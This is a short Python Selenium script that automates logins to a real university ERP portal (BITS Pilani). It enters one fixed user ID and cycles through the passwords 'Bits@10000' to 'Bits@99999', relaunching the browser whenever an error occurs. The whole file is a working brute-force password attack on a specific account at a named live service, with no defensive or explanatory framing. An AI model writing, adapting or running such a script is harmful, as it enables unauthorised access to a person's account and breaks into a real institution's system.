from selenium import webdriver
from selenium.webdriver.common.keys import Keys
browser = webdriver.Firefox()
browser.get('https://erp.bits-pilani.ac.in/psp/ps/EMPLOYEE/HRMS/h/?tab=DEFAULT&cmd=login&errorCode=105&languageCd=ENG')


for i in range(10000,100000):
 try:
    password="Bits@"+str(i)

    userElem=browser.find_element_by_id('userid')
    userElem.send_keys('11120150734')
    passElem=browser.find_element_by_id('pwd')
    submitElem=browser.find_element_by_class_name('psloginbutton')
    passElem.send_keys(password)

    submitElem.click()
    print(password)
 except:
    browser = webdriver.Firefox()
    browser.get('https://erp.bits-pilani.ac.in/psp/ps/EMPLOYEE/HRMS/h/?tab=DEFAULT&cmd=login&errorCode=105&languageCd=ENG')
    password="Bits@"+str(i)

    userElem=browser.find_element_by_id('userid')
    userElem.send_keys('11120150734')
    passElem=browser.find_element_by_id('pwd')
    submitElem=browser.find_element_by_class_name('psloginbutton')
    passElem.send_keys(password)

    submitElem.click()
    print(password)
